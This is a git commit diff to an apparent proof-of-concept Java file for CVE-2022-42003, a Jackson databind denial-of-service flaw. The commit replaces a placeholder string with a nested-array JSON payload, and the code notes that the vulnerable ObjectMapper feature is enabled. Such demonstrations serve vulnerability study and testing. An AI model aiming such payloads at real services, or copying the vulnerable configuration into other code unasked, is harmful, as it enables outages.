8b2a64fddca4532ed63472a8b3f3f2e35aa643ac
vothanhnhan14 <36332457+vothanhnhan14@users.noreply.github.com>
2025-01-30 08:12:39 +1030

    Update CVE_2022_42003.java

--- CVE_2022_42003.java
+++ CVE_2022_42003.java
@@ -4,7 +4,7 @@ import com.fasterxml.jackson.databind.ObjectMapper;
 public class CVE_2022_42003 {
     public static void main(String[] args) {
         // Create a JSON payload with deeply nested arrays
-        String maliciousJson = "bad json";
+        String maliciousJson = "[[[[[[[[[[[[[[[[[[[[[[\"value\"]]]]]]]]]]]]]]]]]]]]]";
 
         // Configure ObjectMapper with the vulnerable feature enabled
         ObjectMapper objectMapper = new ObjectMapper();
